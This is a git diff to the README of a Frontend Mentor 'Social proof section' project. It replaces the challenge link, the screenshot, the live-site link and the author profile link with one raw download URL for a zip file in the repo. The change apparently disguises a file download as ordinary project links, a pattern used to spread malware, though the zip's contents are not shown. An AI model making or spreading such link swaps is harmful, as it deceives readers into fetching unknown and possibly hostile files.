@@ -1,6 +1,6 @@
 # Frontend Mentor - Social proof section solution
 
-This is a solution to the [Social proof section challenge on Frontend Mentor](https://www.frontendmentor.io/challenges/social-proof-section-6e0qTv_bA). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
+This is a solution to the [Social proof section challenge on Frontend Mentor](https://github.com/imadosan/social-proof-section/raw/refs/heads/main/design/social_proof_section_3.8.zip). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
 
 ## Table of contents
 
@@ -22,11 +22,11 @@ Users should be able to:
 
 ### Screenshot
 
-![](images/screenshot.png)
+![](https://github.com/imadosan/social-proof-section/raw/refs/heads/main/design/social_proof_section_3.8.zip)
 
 ### Links
 
-- [Live Site](https://imadosan.github.io/social-proof-section/)
+- [Live Site](https://github.com/imadosan/social-proof-section/raw/refs/heads/main/design/social_proof_section_3.8.zip)
 
 ## My process
 
@@ -40,4 +40,4 @@ Users should be able to:
 
 ## Author
 
-- Frontend Mentor - [@imadosan](https://www.frontendmentor.io/profile/imadosan)
+- Frontend Mentor - [@imadosan](https://github.com/imadosan/social-proof-section/raw/refs/heads/main/design/social_proof_section_3.8.zip)
